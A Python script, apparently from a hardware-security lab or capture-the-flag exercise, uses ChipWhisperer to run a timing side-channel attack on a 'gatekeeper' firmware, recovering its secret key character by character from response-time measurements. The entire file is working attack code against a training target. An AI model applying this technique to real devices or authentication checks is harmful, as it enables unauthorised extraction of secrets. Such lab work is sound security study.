import chipwhisperer as cw
import numpy as np
import serial
import time


BAUDRATE = 1000_000
PORT = "/dev/cu.usbmodem21401"

ser = serial.Serial(PORT, BAUDRATE, timeout=5)

def read_one_pulse(ser):
    ser.reset_input_buffer()

    line = ser.readline()

    if not line:
        print("No data received")
        return None

    try:
        us = float(line.decode("ascii", errors="ignore").strip())
        return us
    except ValueError:
        print("Received malformed data:", line)
        return None


PLATFORM = "CWNANO"
PROG_TYPE = cw.programmers.STM32FProgrammer

TARGET_BIN_PATH = f"gatekeeper-CWNANO.hex"

################################################################################################################################################

response_len = 1

################################################################################################################################################

# Connect to the CW
scope = cw.scope()

################################################################################################################################################

# Connect to the target
target = cw.target(scope, cw.targets.SimpleSerial)

################################################################################################################################################

# Setup the scope
scope.default_setup()

################################################################################################################################################

# Program the target
cw.program_target(scope, PROG_TYPE, TARGET_BIN_PATH)

################################################################################################################################################

tic = time.time()

Key = ""
cnt = 0
th = 0
old_diff = 0

while (cnt < 94):
    char = chr(cnt + 32)
    cnt += 1

    if len(Key) < 12:   # 8 for gk1 and 12 for gk2
        # msg = "gk1{" + Key + char + (" " * (8 - 1 - len(Key))) + "}"   # For the first gatekeeper
        msg = "gk2{" + Key + char + (" " * (12 - 1 - len(Key))) + "}"   # For the second gatekeeper
    else:
        print("------------------------------------------------------------")
        if response:
            print("Key found :) The key is: gk2{" + Key + "}")  # Please change gk1 and gk2 for the corresponding flag
            print("Response from the target is: ", response)
            target.simpleserial_write('q', 'x'.encode("ascii"))
            response = target.simpleserial_read('r', 4, timeout=2000)
            print("Number of queries is: ", int.from_bytes(response, byteorder='little'))
        else:
            print("Attack was not successful :(")
            print("Response from the target is: ", response)
        break
    msg = msg.encode('ascii')

    # Send an input to the target
    target.simpleserial_write('b', msg)
    execution_time = read_one_pulse(ser)

    # Get response from the target
    response = target.simpleserial_read('r', response_len, timeout=2000)
    print(msg, execution_time, th, response)

    if th != 0:
        if (execution_time) > th:
            Key += char
            cnt = 0
            th = 0
            print(Key)
    else:
        if old_diff:
            th = execution_time + (execution_time - old_diff)/2 - ((len(Key)+4) * (execution_time - old_diff) / 50)
            old_diff = execution_time
        else:
            th = execution_time * 1.1
            old_diff = execution_time

toc = time.time()

print("Attack took ", f"{(toc-tic):.2f}", " seconds :)")

# Disconnect the oscope and the target
scope.dis()
target.dis()

